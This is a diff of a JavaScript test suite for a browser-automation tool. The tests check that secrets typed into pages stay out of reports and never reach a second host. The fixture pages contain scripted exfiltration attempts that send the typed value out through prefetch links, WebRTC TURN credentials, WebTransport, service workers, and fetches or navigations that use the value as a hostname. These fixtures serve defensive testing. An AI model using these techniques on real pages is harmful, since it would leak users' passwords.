@@ -2,7 +2,7 @@
 
 // A real browser against real servers, because a fake page cannot show these failing:
 // two rounds of navigation guards passed their tests and still let the value out. In a
-// run with value_env or --save-state the browser only reaches loopback, so what these
+// run with value_env or --save-state the pages only reach loopback, so what these
 // tests count is bytes: the second host is 127.0.0.2, which `isLoopbackUrl` does not
 // take for local, and it must receive nothing, on any channel, in TCP or UDP. Nothing
 // leaves the machine.
@@ -109,6 +109,9 @@ async function servers() {
     '/prefetch': (send) => send(200, page('Sign in', `${FIELD}${onInput(`for(const rel of ["prefetch","preconnect","dns-prefetch"]){const l=document.createElement("link");l.rel=rel;l.href="${out}/"+rel+"?v="+v;document.head.append(l)}`)}`)),
     '/webrtc': (send) => send(200, page('Sign in', `${FIELD}${onInput(`const c=new RTCPeerConnection({iceServers:[{urls:"stun:127.0.0.2:${external.udpPort}"},{urls:"turn:127.0.0.2:${external.udpPort}",username:v,credential:v}]});c.createDataChannel("x");c.createOffer().then((o)=>c.setLocalDescription(o))`)}`)),
     '/webtransport': (send) => send(200, page('Sign in', `${FIELD}${onInput(`try{new WebTransport("https://127.0.0.2:${external.udpPort}/wt?v="+v).ready.catch(()=>{})}catch(x){}`)}`)),
+    '/echo': (send) => send(200, page('Echo', '<label>Secret<input type="text" id="p"></label><p id="out"></p><script>document.getElementById("p").addEventListener("input",(e)=>{const v=e.target.value;console.error("enc="+encodeURIComponent(v));console.error("raw="+v);document.getElementById("out").textContent="json="+JSON.stringify(v)+" b64="+btoa(v);fetch("/api/"+encodeURIComponent(v))})</script>')),
+    '/as-host': (send) => send(200, page('Sign in', `${FIELD}${onInput('fetch("http://"+e.target.value+".example.test/",{mode:"no-cors"})')}`)),
+    '/as-host-nav': (send) => send(200, page('Sign in', `${FIELD}${onInput('location.href="http://"+e.target.value+".example.test/"')}`)),
     '/sw.js': (send) => send(200, `self.addEventListener("install",()=>self.skipWaiting());self.addEventListener("activate",(e)=>e.waitUntil(clients.claim()));self.addEventListener("message",(e)=>{fetch("${out}/sw?v="+e.data,{mode:"no-cors"})})`, { 'content-type': 'text/javascript' }),
     '/sw': (send) => send(200, page('Sign in', `${FIELD}<script>navigator.serviceWorker.register("/sw.js")</script>${onInput('navigator.serviceWorker.ready.then((r)=>r.active.postMessage(v))')}`)),
     '/all': (send) => send(200, page('Sign in', `${FIELD}<iframe id="f"></iframe><script>navigator.serviceWorker.register("/sw.js")</script>${onInput(`${allChannels}navigator.serviceWorker.ready.then((r)=>r.active.postMessage(v));`)}`)),
@@ -253,7 +256,7 @@ test('real browser: what the page tried is listed as information, and the step t
 
   const noField = await run(root, app.url, { steps: via('/late-redirect', fill) });
   assert.equal(noField.ok, false);
-  assert.match(noField.steps[1].error, /the browser could not reach 127\.0\.0\.2: this run only reaches loopback/);
+  assert.match(noField.steps[1].error, /the browser could not reach 127\.0\.0\.2: the pages of this run only reach loopback/);
   assert.equal(noField.steps[1].detail, '', 'it never says it filled what it did not');
 
   const redirected = await run(root, app.url, { steps: via('/idp', fill) });
@@ -275,7 +278,7 @@ test('real browser: what the page tried is listed as information, and the step t
   assert.equal(down.ok, false);
   assert.doesNotMatch(down.steps[3].error, /could not reach/);
   assert.match(down.steps[3].error, /ERR_CONNECTION_REFUSED/);
-  assert.match(down.steps[3].error, /the pages of this run were refused 127\.0\.0\.2: it only reaches loopback/);
+  assert.match(down.steps[3].error, /the pages of this run were refused 127\.0\.0\.2: they only reach loopback/);
 
   const newTab = await run(root, app.url, { steps: via('/open-out', fill, wait) }, { saveState: STATE });
   assert.equal(newTab.ok, true, 'a new tab is not the page under test');
@@ -329,6 +332,55 @@ test('real browser: login, the session kept, and the flow reused, on pages that 
   await settle();
   assert.equal(again.ok, true, JSON.stringify(again.steps.filter((step) => !step.ok)));
   assert.equal(app.external.seen.bytes, before, 'nothing more reached it');
+});
+
+const filesUnder = async (dir) => {
+  const found = [];
+  for (const entry of await fs.readdir(dir, { withFileTypes: true })) {
+    const file = path.join(dir, entry.name);
+    if (entry.isDirectory()) found.push(...await filesUnder(file));
+    else if (!file.endsWith('.png')) found.push(file);
+  }
+  return found;
+};
+const textsOf = async (root, report) => [JSON.stringify(report), ...await Promise.all((await filesUnder(root)).map((file) => fs.readFile(file, 'utf8')))];
+
+test('real browser: what the page does with the value stays out of the report', async (t) => {
+  if (!(await available())) return t.skip('no browser or no second loopback address here');
+  const root = await project(t);
+  const app = await servers();
+  t.after(app.close);
+  const special = 'S3cr3t p@ss/"zz!';
+  const report = await run(root, app.url, { steps: [
+    { do: 'goto', url: '/echo' },
+    { do: 'fill', target: 'label=Secret', value_env: 'E2E_PASSWORD' },
+    { do: 'snapshot' },
+    { do: 'wait', ms: 300 }
+  ] }, { env: { E2E_PASSWORD: special }, persist: true, slug: 'orders' });
+  assert.equal(report.ok, true, JSON.stringify(report.steps.filter((step) => !step.ok)));
+  assert.ok(report.console.samples.some((sample) => sample.text === 'enc=[env.E2E_PASSWORD]'));
+  assert.ok(report.network.rows.some((row) => row.url.includes('/api/[env.E2E_PASSWORD]')));
+  const forms = [special, encodeURIComponent(special), JSON.stringify(special).slice(1, -1), Buffer.from(special).toString('base64')];
+  const seen = await textsOf(root, report);
+  assert.ok(seen.length >= 3);
+  for (const text of seen) for (const form of forms) assert.equal(text.includes(form), false, form);
+});
+
+test('real browser: a value used as a host name stays out of the report, in the lowercase the parser gives it', async (t) => {
+  if (!(await available())) return t.skip('no browser or no second loopback address here');
+  const root = await project(t);
+  const app = await servers();
+  t.after(app.close);
+  const hostValue = 'Seeded-Host-Value-9731';
+  const report = await run(root, app.url, { steps: via('/as-host', fill, wait) }, { env: { E2E_PASSWORD: hostValue }, persist: true, slug: 'orders' });
+  assert.equal(report.ok, true, JSON.stringify(report.steps.filter((step) => !step.ok)));
+  assert.ok(report.blocked_hosts_from_pages.includes('[env.E2E_PASSWORD].example.test'), JSON.stringify(report.blocked_hosts));
+  const leaving = await run(root, app.url, { steps: via('/as-host-nav', fill, wait) }, { env: { E2E_PASSWORD: hostValue }, persist: true, slug: 'orders' });
+  assert.equal(leaving.ok, false);
+  assert.match(leaving.steps.find((step) => !step.ok).error, /could not reach \[env\.E2E_PASSWORD\]\.example\.test/);
+  for (const seen of [report, leaving]) {
+    for (const text of await textsOf(root, seen)) assert.equal(text.toLowerCase().includes(hostValue.toLowerCase()), false, text.slice(0, 200));
+  }
 });
 
 test('real browser: the three local names keep working', async (t) => {
@@ -439,5 +491,5 @@ test('real browser: browser:run from script files, the way a phase runs it', asy
   assert.equal(lines.join('\n').includes(TYPED_VALUE), false, 'nothing the command printed holds the value');
   const written = await fs.readFile(path.join(root, login.report_path), 'utf8');
   assert.equal(written.includes(TYPED_VALUE), false);
-  assert.match(await fs.readFile(path.join(root, login.markdown_path), 'utf8'), /This run only reached loopback[\s\S]*Hosts a page asked for, refused \(information\): 127\.0\.0\.2/);
+  assert.match(await fs.readFile(path.join(root, login.markdown_path), 'utf8'), /The pages of this run only reached loopback[\s\S]*Hosts a page asked for, refused \(information\): 127\.0\.0\.2/);
 });
